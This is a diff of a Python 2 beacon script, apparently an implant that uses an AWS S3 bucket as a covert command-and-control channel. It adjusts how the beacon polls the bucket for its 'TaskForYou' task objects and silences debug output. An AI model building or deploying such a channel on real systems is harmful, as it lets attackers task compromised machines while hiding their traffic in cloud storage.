@@ -13,7 +13,6 @@ import boto3
 import uuid
 from botocore.exceptions import ClientError
 from time import sleep
-from pprint import pprint
 
 #####################
 # Bootlegged Config #
@@ -26,7 +25,7 @@ AWS_SECRET_KEY = 'YOUR_SECRET_KEY'
 AWS_ACCESS_KEY = 'YOUR_ACCESS_KEY'
 
 s3          = boto3.client('s3', aws_access_key_id=AWS_ACCESS_KEY, aws_secret_access_key=AWS_SECRET_KEY)
-bucketName  = 'BUCKETNAME'
+bucketName  = 'YOUR_S3BUCKET'
 beaconId    = str(uuid.uuid4())
 taskKeyName = beaconId + ':TaskForYou'
 respKeyName = beaconId + ':RespForYou'
@@ -72,28 +71,25 @@ def recvData():
     """
     while True:
         try:
-            resp = s3.list_objects(Bucket=bucketName)
+            resp = s3.list_objects(Bucket=bucketName, Prefix=taskKeyName)
             objects = resp['Contents']
-            tasks = []
-            for obj in objects:
-                if taskKeyName in obj['Key']:
+            if objects:
+                tasks = []
+                for obj in objects:
                     resp = s3.get_object(Bucket=bucketName, Key=obj['Key'])
                     msg = resp['Body'].read()
                     msg = decode(msg)
                     s3.delete_object(Bucket=bucketName, Key=obj['Key'])
                     tasks.append(msg)
-            if tasks:
                 return tasks
         except ClientError as e:
             if e.response['Error']['Code'] == 'NoSuchKey':
-                print '[-] No data to retrieve yet. Sleeping...'
+                # print '[-] No data to retrieve yet. Sleeping...'
                 sleep(5)
             else:
                 raise e
         except KeyError as e:
-            print 'Content did not look like we expected. Here is the response:'
-            pprint(resp)
-            print e
+            # Received no tasks
             sleep(5)
 
 def registerClient():
